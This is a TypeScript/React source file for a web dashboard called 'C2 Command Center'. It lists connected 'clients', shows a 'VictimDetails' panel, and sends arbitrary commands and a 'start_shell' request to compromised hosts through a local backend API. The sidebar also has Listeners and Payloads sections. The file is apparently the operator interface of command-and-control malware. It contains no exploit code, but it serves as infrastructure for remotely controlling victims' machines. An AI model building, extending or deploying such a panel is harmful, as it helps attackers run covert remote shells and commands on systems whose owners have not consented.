"use client";

import React, { useState, useEffect, createContext, useContext } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import { cn } from "@/lib/utils";
import {
  LayoutDashboard,
  UserCog,
  Settings,
  LogOut,
  Menu,
  X,
  Terminal,
  Server,
  Shield,
  Globe,
  Wifi,
  Clock,
  AlertCircle,
  ChevronDown,
  Search,
  Bell,
  User,
} from "lucide-react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import VictimDetails from "./VictimDetails";

interface Links {
  label: string;
  href: string;
  icon: React.JSX.Element | React.ReactNode;
}

interface SidebarContextProps {
  open: boolean;
  setOpen: React.Dispatch<React.SetStateAction<boolean>>;
  animate: boolean;
}

interface Client {
  client_id: number;
  addr: string;
  userinfo: string;
  shell_active: boolean;
}

interface LogEntry {
  timestamp: string;
  level: "info" | "warning" | "error";
  message: string;
}

const SidebarContext = createContext<SidebarContextProps | undefined>(
  undefined
);

const useSidebar = () => {
  const context = useContext(SidebarContext);
  if (!context) {
    throw new Error("useSidebar must be used within a SidebarProvider");
  }
  return context;
};

const SidebarProvider = ({
  children,
  open: openProp,
  setOpen: setOpenProp,
  animate = true,
}: {
  children: React.ReactNode;
  open?: boolean;
  setOpen?: React.Dispatch<React.SetStateAction<boolean>>;
  animate?: boolean;
}) => {
  const [openState, setOpenState] = useState(false);

  const open = openProp !== undefined ? openProp : openState;
  const setOpen = setOpenProp !== undefined ? setOpenProp : setOpenState;

  return (
    <SidebarContext.Provider value={{ open, setOpen, animate }}>
      {children}
    </SidebarContext.Provider>
  );
};

const Sidebar = ({
  children,
  open,
  setOpen,
  animate,
}: {
  children: React.ReactNode;
  open?: boolean;
  setOpen?: React.Dispatch<React.SetStateAction<boolean>>;
  animate?: boolean;
}) => {
  return (
    <SidebarProvider open={open} setOpen={setOpen} animate={animate}>
      {children}
    </SidebarProvider>
  );
};

const SidebarBody = (props: React.ComponentProps<typeof motion.div>) => {
  return (
    <>
      <DesktopSidebar {...props} />
      <MobileSidebar {...(props as React.ComponentProps<"div">)} />
    </>
  );
};

const DesktopSidebar = ({
  className,
  children,
  ...props
}: React.ComponentProps<typeof motion.div>) => {
  const { open, setOpen, animate } = useSidebar();
  return (
    <motion.div
      className={cn(
        "h-full px-4 py-4 hidden md:flex md:flex-col bg-background border-r border-border w-[300px] flex-shrink-0",
        className
      )}
      animate={{
        width: animate ? (open ? "300px" : "60px") : "300px",
      }}
      onMouseEnter={() => setOpen(true)}
      onMouseLeave={() => setOpen(false)}
      {...props}
    >
      {children}
    </motion.div>
  );
};

const MobileSidebar = ({
  className,
  children,
  ...props
}: React.ComponentProps<"div">) => {
  const { open, setOpen } = useSidebar();
  return (
    <>
      <div
        className={cn(
          "h-10 px-4 py-4 flex flex-row md:hidden items-center justify-between bg-background w-full"
        )}
        {...props}
      >
        <div className="flex justify-end z-20 w-full">
          <Menu
            className="text-foreground cursor-pointer"
            onClick={() => setOpen(!open)}
          />
        </div>
        <AnimatePresence>
          {open && (
            <motion.div
              initial={{ x: "-100%", opacity: 0 }}
              animate={{ x: 0, opacity: 1 }}
              exit={{ x: "-100%", opacity: 0 }}
              transition={{
                duration: 0.3,
                ease: "easeInOut",
              }}
              className={cn(
                "fixed h-full w-full inset-0 bg-background p-10 z-[100] flex flex-col justify-between",
                className
              )}
            >
              <div
                className="absolute right-10 top-10 z-50 text-foreground cursor-pointer"
                onClick={() => setOpen(!open)}
              >
                <X />
              </div>
              {children}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </>
  );
};

const SidebarLink = ({
  link,
  className,
  ...props
}: {
  link: Links;
  className?: string;
  props?: React.ComponentProps<typeof Link>;
}) => {
  const { open, animate } = useSidebar();
  return (
    <Link
      href={link.href}
      className={cn(
        "flex items-center justify-start gap-2 group/sidebar py-2",
        className
      )}
      {...props}
    >
      {link.icon}
      <motion.span
        animate={{
          display: animate ? (open ? "inline-block" : "none") : "inline-block",
          opacity: animate ? (open ? 1 : 0) : 1,
        }}
        className="text-foreground text-sm group-hover/sidebar:translate-x-1 transition duration-150 whitespace-pre inline-block !p-0 !m-0"
      >
        {link.label}
      </motion.span>
    </Link>
  );
};

const Logo = () => {
  return (
    <Link
      href="#"
      className="font-normal flex space-x-2 items-center text-sm text-foreground py-1 relative z-20"
    >
      <div className="h-5 w-6 bg-primary rounded-br-lg rounded-tr-sm rounded-tl-lg rounded-bl-sm flex-shrink-0" />
      <motion.span
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        className="font-medium text-foreground whitespace-pre"
      >
        C2 Command
      </motion.span>
    </Link>
  );
};

const LogoIcon = () => {
  return (
    <Link
      href="#"
      className="font-normal flex space-x-2 items-center text-sm text-foreground py-1 relative z-20"
    >
      <div className="h-5 w-6 bg-primary rounded-br-lg rounded-tr-sm rounded-tl-lg rounded-bl-sm flex-shrink-0" />
    </Link>
  );
};

const C2Dashboard = () => {
  const [open, setOpen] = useState(false);
  const [activeTab, setActiveTab] = useState("clients");

  // Real backend integration
  const [clients, setClients] = useState<Client[]>([]);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [loadingClients, setLoadingClients] = useState(true);
  const [loadingLogs, setLoadingLogs] = useState(false);
  // Command state
  const [command, setCommand] = useState<{ [id: number]: string }>({});
  const [feedback, setFeedback] = useState<{ [id: number]: string }>({});
  const [sending, setSending] = useState<{ [id: number]: boolean }>({});

  useEffect(() => {
    setLoadingClients(true);
    fetch("http://localhost:5000/api/clients")
      .then(res => res.json())
      .then(data => {
        setClients(data.clients);
        setLoadingClients(false);
        if (data.clients.length > 0 && !selectedClient) {
          setSelectedClient(data.clients[0].client_id.toString());
        }
      });
  }, []);

  useEffect(() => {
    if (selectedClient) {
      setLoadingLogs(true);
      fetch(`http://localhost:5000/api/logs/${selectedClient}`)
        .then(res => res.json())
        .then(data => {
          setLogs(data.logs);
          setLoadingLogs(false);
        });
    }
  }, [selectedClient]);

  const sendCommand = (clientId: number) => {
    setSending(s => ({ ...s, [clientId]: true }));
    fetch("http://localhost:5000/api/send_command", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        client_id: clientId,
        command: command[clientId] || "",
      }),
    })
      .then(res => res.json())
      .then(data => {
        setFeedback(f => ({ ...f, [clientId]: data.result }));
        setCommand(c => ({ ...c, [clientId]: "" }));
      })
      .finally(() => setSending(s => ({ ...s, [clientId]: false })));
  };

  const links = [
    {
      label: "Dashboard",
      href: "#",
      icon: (
        <LayoutDashboard className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
    {
      label: "Clients",
      href: "#",
      icon: (
        <Server className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
    {
      label: "Listeners",
      href: "#",
      icon: (
        <Wifi className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
    {
      label: "Payloads",
      href: "#",
      icon: (
        <Shield className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
    {
      label: "Terminal",
      href: "#",
      icon: (
        <Terminal className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
    {
      label: "Settings",
      href: "#",
      icon: (
        <Settings className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
    {
      label: "Logout",
      href: "#",
      icon: (
        <LogOut className="text-foreground h-5 w-5 flex-shrink-0" />
      ),
    },
  ];

  return (
    <div className="h-screen flex flex-col bg-background text-foreground">
      <div className="flex flex-1 overflow-hidden">
        <Sidebar open={open} setOpen={setOpen}>
          <SidebarBody className="justify-between gap-10">
            <div className="flex flex-col flex-1 overflow-y-auto overflow-x-hidden">
              {open ? <Logo /> : <LogoIcon />}
              <div className="mt-8 flex flex-col gap-2">
                {links.map((link, idx) => (
                  <SidebarLink key={idx} link={link} />
                ))}
              </div>
            </div>
            <div>
              <SidebarLink
                link={{
                  label: "Admin User",
                  href: "#",
                  icon: (
                    <div className="h-7 w-7 flex-shrink-0 rounded-full bg-primary/10 flex items-center justify-center">
                      <User className="h-4 w-4 text-primary" />
                    </div>
                  ),
                }}
              />
            </div>
          </SidebarBody>
        </Sidebar>

        <div className="flex-1 flex flex-col overflow-hidden">
          {/* Top Navbar */}
          <header className="h-16 border-b border-border flex items-center justify-between px-6">
            <div className="flex items-center gap-4">
              <h1 className="text-xl font-semibold">C2 Command Center</h1>
            </div>
            <div className="flex items-center gap-4">
              <div className="relative">
                <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  type="search"
                  placeholder="Search..."
                  className="w-64 pl-8 bg-background"
                />
              </div>
              <Button variant="outline" size="icon">
                <Bell className="h-4 w-4" />
              </Button>
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="outline" className="gap-2">
                    Admin <ChevronDown className="h-4 w-4" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end">
                  <DropdownMenuItem>Profile</DropdownMenuItem>
                  <DropdownMenuItem>Settings</DropdownMenuItem>
                  <DropdownMenuItem>Logout</DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </header>

          {/* Main Content */}
          <main className="flex-1 overflow-auto p-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm font-medium">
                    Active Clients
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">4</div>
                  <p className="text-xs text-muted-foreground mt-1">
                    +2 from yesterday
                  </p>
                </CardContent>
              </Card>
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm font-medium">
                    Active Listeners
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">3</div>
                  <p className="text-xs text-muted-foreground mt-1">
                    No change from yesterday
                  </p>
                </CardContent>
              </Card>
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm font-medium">
                    Admin Privileges
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">3</div>
                  <p className="text-xs text-muted-foreground mt-1">
                    +1 from yesterday
                  </p>
                </CardContent>
              </Card>
            </div>

            <Tabs defaultValue="clients" className="w-full">
              <TabsList className="mb-4">
                <TabsTrigger value="clients">Connected Clients</TabsTrigger>
                <TabsTrigger value="logs">System Logs</TabsTrigger>
              </TabsList>
              <TabsContent value="clients" className="space-y-4">
                <Card>
                  <CardHeader>
                    <CardTitle>Connected Clients</CardTitle>
                    <CardDescription>
                      Manage your connected clients and execute commands.
                    </CardDescription>
                  </CardHeader>
                  <CardContent>
                    {loadingClients ? (
                      <div>Loading clients...</div>
                    ) : (
                      <>
                        <div className="mb-4">
                          <label className="block mb-1 font-medium">Select Client:</label>
                          <select
                            className="border rounded px-2 py-1"
                            value={selectedClient || ""}
                            onChange={e => setSelectedClient(e.target.value)}
                          >
                            {clients.map(c => (
                              <option key={c.client_id} value={c.client_id}>{c.userinfo} (ID: {c.client_id})</option>
                            ))}
                          </select>
                        </div>
                        <Table>
                          <TableHeader>
                            <TableRow>
                              <TableHead>ID</TableHead>
                              <TableHead>User Info</TableHead>
                              <TableHead>Actions</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {clients.map((client) => (
                              <TableRow key={client.client_id}>
                                <TableCell className="font-medium">
                                  {client.client_id}
                                </TableCell>
                                <TableCell>{client.userinfo}</TableCell>
                                <TableCell>
                                  {/* Shell Button */}
                                  {!client.shell_active ? (
                                    <Button
                                      size="sm"
                                      variant="default"
                                      className="mr-2"
                                      onClick={async () => {
                                        try {
                                          await fetch("http://localhost:5000/api/send_command", {
                                            method: "POST",
                                            headers: { "Content-Type": "application/json" },
                                            body: JSON.stringify({
                                              client_id: client.client_id,
                                              command: "start_shell",
                                            }),
                                          });
                                          // Optionally show feedback
                                          setFeedback(f => ({ ...f, [client.client_id]: "Shell starting..." }));
                                          // Refresh clients to update shell_active
                                          setLoadingClients(true);
                                          fetch("http://localhost:5000/api/clients")
                                            .then(res => res.json())
                                            .then(data => {
                                              setClients(data.clients);
                                              setLoadingClients(false);
                                            });
                                        } catch (error) {
                                          setFeedback(f => ({ ...f, [client.client_id]: "Failed to start shell." }));
                                        }
                                      }}
                                    >
                                      Shell
                                    </Button>
                                  ) : (
                                    <span className="text-muted-foreground mr-2">Shell Active</span>
                                  )}
                                  {/* Command input and send button */}
                                  <input
                                    type="text"
                                    value={command[client.client_id] || ""}
                                    onChange={e => setCommand(c => ({ ...c, [client.client_id]: e.target.value }))}
                                    placeholder="Enter command"
                                    className="border rounded px-2 py-1 mr-2"
                                  />
                                  <Button
                                    size="sm"
                                    variant="outline"
                                    onClick={() => sendCommand(client.client_id)}
                                    disabled={!command[client.client_id] || sending[client.client_id]}
                                  >
                                    {sending[client.client_id] ? "Sending..." : "Send"}
                                  </Button>
                                  {feedback[client.client_id] && (
                                    <div className="text-xs mt-1">{feedback[client.client_id]}</div>
                                  )}
                                </TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                        {clients.length > 0 && selectedClient && (
                          <VictimDetails client={clients.find(c => c.client_id.toString() === selectedClient)!} />
                        )}
                      </>
                    )}
                  </CardContent>
                </Card>
              </TabsContent>
              <TabsContent value="logs" className="space-y-4">
                <Card>
                  <CardHeader>
                    <CardTitle>System Logs</CardTitle>
                    <CardDescription>
                      View recent system activity and events for the selected client.
                    </CardDescription>
                  </CardHeader>
                  <CardContent>
                    {loadingLogs ? (
                      <div>Loading logs...</div>
                    ) : (
                      <div className="bg-black text-green-400 font-mono text-sm p-4 rounded-md h-[400px] overflow-y-auto">
                        {logs.length === 0 ? (
                          <div>No logs for this client.</div>
                        ) : (
                          logs.map((log, index) => (
                            <div key={index} className="mb-1">
                              <span className="text-gray-400">[{log.timestamp}]</span>{" "}
                              <span
                                className={
                                  log.level === "error"
                                    ? "text-red-400"
                                    : log.level === "warning"
                                    ? "text-yellow-400"
                                    : "text-green-400"
                                }
                              >
                                [{log.level.toUpperCase()}]
                              </span>{" "}
                              {log.message}
                            </div>
                          ))
                        )}
                        <div className="flex items-center mt-2">
                          <span className="text-green-400 mr-1">$</span>
                          <div className="animate-pulse">_</div>
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </main>
        </div>
      </div>
    </div>
  );
};

export default C2Dashboard; 